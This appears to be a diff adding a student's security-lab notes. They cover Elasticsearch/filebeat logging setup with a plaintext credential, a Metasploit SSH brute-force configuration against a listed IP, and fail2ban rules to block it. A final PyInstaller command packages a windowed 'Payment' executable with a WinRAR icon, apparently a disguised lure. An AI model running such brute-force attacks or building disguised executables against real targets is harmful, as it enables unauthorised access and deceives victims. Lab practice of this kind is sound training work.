@@ -1,0 +1,71 @@
+192.168.101.229
+sudo systemctl status ssh
+
+sudo su
+
+msfconsole
+
+208.8.8.133
+sudo systemctl status rsyslog
+
+sudo nano /etc/filebeat/filebeat.yml
+
+sudo systemctl restart filebeat
+sudo systemctl enable elasticsearch
+sudo systemctl start elasticsearch
+
+http://208.8.8.133:5601/
+
+elastic
+C1sc0123
+
+!!msf bruteforce config
+search ssh_login
+use 0
+show options
+set rhosts 208.8.8.133
+set user_file /home/kali/desktop/username
+set pass_file /home/kali/desktop/password
+set verbose true
+
+exploit
+
+
+!Ban/Block
+sudo dnf -y install fail2ban
+sudo systemctl enable --now fail2ban
+fail2ban-client status sshd
+sudo nano/etc/fai2ban/jail.local
+
+
+[sshd]
+
+enabled = true
+port = ssh
+logpath = /var/log/secure
+maxretry =5
+bandtime =300
+findtime= 60
+action = firewallcmd-allports
+
+sudo systemctl restart fail2ban
+
+!Unban
+sudo fail2ban-client set sshd unbanip "attacker ip address"
+
+
+sudo mkdir -p /mnt/hgfs/
+sudo vmhgfs-fuse .host:/exe-to-pdf /mnt/hgfs -o allow_other
+ls /mnt/hgfs/
+
+EMULATOR:
+cd /mnt/hgfs
+ls -lb
+file -- *
+
+pip install PILLOW
+
+..\venv\Scripts\Activate.ps1 
+pip install pyinstaller
+
+python -m PyInstaller --onefile --windowed --name Payment --icon "winrar (2) (5).ico" --add-data "QRC (2) (5).jpg;." --add-data "alert (1) (3).wav;." QR.py
